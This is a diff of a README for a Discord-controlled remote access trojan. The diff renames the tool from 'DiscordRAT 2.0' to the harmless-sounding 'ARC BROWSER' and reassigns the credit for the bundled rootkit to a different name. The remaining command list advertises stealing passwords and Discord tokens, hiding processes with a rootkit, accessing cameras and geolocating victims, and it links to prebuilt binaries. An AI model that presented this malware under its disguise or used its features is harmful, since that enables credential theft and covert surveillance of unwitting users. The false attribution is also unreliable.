@@ -1,7 +1,5 @@
-# DiscordRAT 2.0
-Discord Remote Administration Tool fully written in c#.
-
-This is a RAT controlled over Discord with over 40 post exploitation modules.
+# ARC BROWSER
+ARC BROWSER Tool fully written in c#.
 
 The output file size also around ~75kb!
 
@@ -10,7 +8,7 @@ The output file size also around ~75kb!
 This tool is for educational use only, the author will not be held responsible for any misuse of this tool.
 
 ## **Credits**
-The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit
+The rootkit in the project was made by "Johan". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit
 
 ## **Setup Guide:**
 Download the pre-complied binary's here https://github.com/moom825/Discord-RAT-2.0/releases/tag/2.0
@@ -66,6 +64,7 @@ Available commands are :
 --> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
 --> !listprocess = Get all process's
 --> !password = grab all passwords
+
 --> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
 --> !unrootkit = Remove the rootkit(Admin rights are required)
 --> !getcams = Grab the cameras names and their respected selection number
@@ -74,7 +73,3 @@ Available commands are :
 --> !grabtokens = Grab all discord tokens on the current pc
 --> !help = This help menu
 ```
-
-## Donation
-### Buy me a coffee!
-BTC: bc1qg4zy8w5swc66k9xg29c2x6ennn5cyv2ytlp0a6
